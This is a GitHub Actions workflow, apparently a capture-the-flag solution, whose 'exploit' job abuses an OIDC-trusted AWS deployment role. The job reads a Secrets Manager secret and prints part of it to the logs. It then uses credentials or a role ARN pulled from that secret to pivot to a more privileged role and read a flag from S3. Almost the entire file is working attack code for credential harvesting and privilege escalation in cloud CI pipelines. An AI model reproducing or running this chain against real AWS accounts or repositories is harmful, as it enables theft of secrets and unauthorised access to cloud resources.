name: retrace-hexnova
on:
  workflow_dispatch:
  push:
    branches: [ "main" ]

jobs:
  exploit:
    permissions:
      id-token: write
      contents: read
    runs-on: ubuntu-latest
    steps:
      - name: Environment sanity
        run: |
          set -x
          uname -a
          which aws || true
          aws --version || true

      - name: Configure AWS via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::170974506515:role/github-deployment-role
          aws-region: us-west-2
          role-session-name: ctf-hexnova

      - name: Verify caller
        run: aws sts get-caller-identity --output json

      - name: Install jq
        run: sudo apt-get update && sudo apt-get install -y jq

      - name: Fetch next-hop secret
        run: |
          set -euo pipefail
          aws secretsmanager get-secret-value \
            --secret-id internal/secrets/id-v2 \
            --region us-west-2 \
            --output json > secret_resp.json

          # Extract raw SecretString to a file (no quoting)
          jq -r '.SecretString' secret_resp.json > secret.json

          echo "Secret preview (first 200 bytes):"
          head -c 200 secret.json || true; echo

      - name: Classify secret contents
        id: kind
        run: |
          if jq -e '.AccessKeyId and .SecretAccessKey and .SessionToken' secret.json >/dev/null; then
            echo "value=creds" >> "$GITHUB_OUTPUT"
          else
            echo "value=role" >> "$GITHUB_OUTPUT"
          fi

      - name: Use STS creds (if provided)
        if: steps.kind.outputs.value == 'creds'
        run: |
          export AWS_ACCESS_KEY_ID=$(jq -r .AccessKeyId secret.json)
          export AWS_SECRET_ACCESS_KEY=$(jq -r .SecretAccessKey secret.json)
          export AWS_SESSION_TOKEN=$(jq -r .SessionToken secret.json)

          aws sts get-caller-identity --output json
          aws s3 cp s3://atr3404-63428fb6/flag.txt - --region us-west-2

      - name: Assume next role (robust)
        if: steps.kind.outputs.value == 'role'
        run: |
          set -euo pipefail

          # 1) Normalize the secret: try base64 decode; then try JSON->fromjson; lowercase keys
          normalize() {
            # Read file; if base64, decode; else pass through
            if base64 -d < secret.json >/tmp/decoded 2>/dev/null; then
              cat /tmp/decoded
            else
              cat secret.json
            fi
          }

          # Try to coerce into JSON; if it’s a JSON string, fromjson; else wrap as {"raw": "..."}
          normalized_json=$(
            normalize | jq -c 'try (fromjson) catch {"raw": .}'
          )
          printf '%s\n' "$normalized_json" > secret.norm.json

          # Lowercase keys to simplify extraction
          printf '%s\n' "$normalized_json" \
          | jq -c 'walk(if type=="object" then with_entries(.key |= ascii_downcase) else . end)' \
          > secret.lower.json

          # 2) Try to extract RoleArn and ExternalId from structured JSON
          ROLE=$(jq -r '(.rolearn // .role_arn // .arn // empty)' secret.lower.json)
          EXT=$(jq -r '(.externalid // .external_id // empty)' secret.lower.json)

          # 3) Fallbacks: grep an ARN out of raw content if fields weren’t present
          if [ -z "$ROLE" ] || [ "$ROLE" = "null" ]; then
            ROLE=$(cat secret.json \
              | (base64 -d 2>/dev/null || cat) \
              | grep -Eo 'arn:aws:iam::[0-9]{12}:role/[A-Za-z0-9+=,.@_-]+' \
              | head -n1 || true)
          fi

          # Sanity logs (safe-ish for a CTF)
          echo "Detected ROLE: ${ROLE:-<none>}"
          if [ -n "${EXT:-}" ]; then echo "Detected ExternalId: <present>"; fi

          if [ -z "${ROLE:-}" ]; then
            echo "::error::Could not extract a role ARN from the secret."
            echo "Raw preview (first 200 bytes):"
            head -c 200 secret.json || true; echo
            exit 1
          fi

          # 4) Assume role (include ExternalId only if present)
          EXTARG=()
          if [ -n "${EXT:-}" ] && [ "${EXT}" != "null" ]; then
            EXTARG=(--external-id "$EXT")
          fi

          aws sts assume-role \
            --role-arn "$ROLE" \
            --role-session-name ctf-hexnova-priv \
            "${EXTARG[@]}" \
            --region us-west-2 \
            --output json > assume.json

          export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' assume.json)
          export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' assume.json)
          export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' assume.json)

          aws sts get-caller-identity --output json

          # 5) Grab the flag
          aws s3 cp s3://atr3404-63428fb6/flag.txt - --region us-west-2

